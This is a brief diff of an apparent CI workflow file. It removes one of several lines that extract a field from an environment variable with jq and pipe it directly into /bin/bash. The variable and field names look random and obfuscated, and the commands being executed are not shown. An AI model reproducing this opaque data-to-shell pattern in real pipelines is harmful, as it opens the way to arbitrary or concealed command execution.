@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
           echo $ic0531 | jq -r .c6 | /bin/bash
-          echo $lgf41 | jq -r .ueb38 | /bin/bash
           printf '%s' "$g3" | jq -r .nwagt3577 | /bin/bash
           printf '%s' "$d19032" | jq -r .cipb851 | /bin/bash
 
